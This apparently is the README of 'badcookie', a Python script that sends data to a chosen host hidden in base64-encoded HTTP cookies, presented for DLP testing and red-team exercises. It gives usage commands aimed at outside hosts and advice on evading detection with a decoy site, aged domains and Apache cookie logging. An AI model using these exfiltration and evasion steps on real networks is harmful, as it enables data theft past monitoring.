# Requirements
Python 2.7

### Libraries
* Requests

# Description
Badcookie exfiltrates data via base64 encoded HTTP cookies.

# Some use cases
* The script can be used for testing the effectiveness of data loss prevention systems.
* Outbound network traffic monitoring systems.
* Red Team / Blue team exercises e.g. see if the blue team can detect data exfiltraion.
* Penetration testing activities

#Things to keep in mind
* The script transmits data via http not https
* Base64 encoded data can be easily decoded
* Be mindful of the cookie size when transmitting data

#Usage
`badcookie.py <destination_host> <exfiltrated_data>`

`Example(1): badcookie.py 10.0.0.2 "very important data"`

`Example(2): badcookie.py www.secretsite.com "very important data"`

Use quotes if you plan to transmit data with whitespace


#Setting up the data exfiltration process

* To make the network traffic look convincing setup a site with a proper domain. It can be a news, blog or any other site. So when you exfiltrate data the network traffic will look like normal web traffic going to a legitimate site. (atleast this is what we are trying to accomplish)
* Fill the site with some real looking content
* If you are testing systems where there is a web filtering proxy involved, try and use domain which is  more than a year old as web filtering proxies block new domains. In either case using an aged domain name will be beneficial.
* Avoid sending data using IP addresses.
* Enable  logging of http cookies in apache ( you can use any server you like). The sample config file in this repository “000-default.conf” in the  “apache_conf” folder can be used to enable cookie logging. Place config file in /etc/apache2/sites-enabled/ and restart Apache.  You should now see a file called “cookies.log” in /var/log/apache2.
* Execute the badcookie script.
* After executing the script you should see the following log entry in cookies.log. The log shows the transmitted base64 cookie.

`10.0.0.2 - - [13/Jun/2015:18:48:17 -0500] "GET / HTTP/1.1" 200 3256 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; :11.0) like Gecko" "dGVzdGluZw=="`

* You can now decode the base64 encoded data.

* Please note that the above process is just a suggestion, you can setup the exfiltration process anyway you like.

* Have fun
